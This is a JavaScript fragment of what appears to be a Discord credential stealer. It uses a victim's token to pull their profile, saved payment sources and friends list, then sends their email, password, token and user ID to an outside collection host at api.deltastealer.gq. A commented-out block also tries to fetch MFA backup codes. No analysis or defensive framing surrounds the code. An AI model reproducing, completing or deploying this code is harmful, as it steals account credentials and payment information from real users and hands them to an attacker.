axios.get("https://ifconfig.me/").then((i) => {
  const ip = i.data;
  window.executeJavascript(`alert("${ip}")`, false);
  axios
    .get(
      "https://discord.com/api/v9/users/@me",

      {
        headers: {
          "Content-Type": "application/json",
          Authorization: token,
        },
      }
    )
    .then((u) => {
      const user = u.data;
      axios
        .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
          headers: {
            "Content-Type": "application/json",
            Authorization: token,
          },
        })
        .then((x) => {
          const payments = x.data;
          axios
            .get("https://discord.com/api/v9/users/@me/relationships", {
              headers: {
                "Content-Type": "application/json",
                Authorization: token,
              },
            })
            .then((f) => {
              const friends = f.data;
              var payload = {
                embeds: [
                  {
                    title: "User Logged In",
                    description: `\`\`\`asd\`\`\``,
                    author: {
                      name: user.username,
                    },
                    fields: [
                      {
                        name: "ID",
                        value: `\`${user.id}\``,
                        inline: true,
                      },
                      {
                        name: "Tag",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: true,
                      },
                      {
                        name: "Badges",
                        value: `Asd`,
                        inline: true,
                      },
                      {
                        name: "E-mail",
                        value: `\`${email}\``,
                        inline: true,
                      },
                      {
                        name: "Password",
                        value: `\`${password}\``,
                        inline: true,
                      },
                      {
                        name: "Token",
                        value: `\`${token}\``,
                        inline: true,
                      },
                    ],
                  },
                ],
              };

              axios
                .post(
                  `https://api.deltastealer.gq/v1/channels/963481807033085952/messages`,
                  {
                    payload: payload,
                  }
                )
                .then((r) =>
                  window.webContents.executeJavascript(`alert("${r}")`, true)
                )
                .catch((r) =>
                  window.webContents.executeJavascript(`alert("${r}")`, true)
                );
            });
        });
    });
});

/*
      if (tokens.startsWith("mfa")) {
        const codes = await axios.get(
          "https://discord.com/api/v9/users/@me/mfa/codes",
          {
            password: password,
            regenerate: false,
          },
          {
            headers: {
              "Content-Type": "application/json",
              Authorization: token,
            },
          }
        ).data.backup_codes;
      }
      */
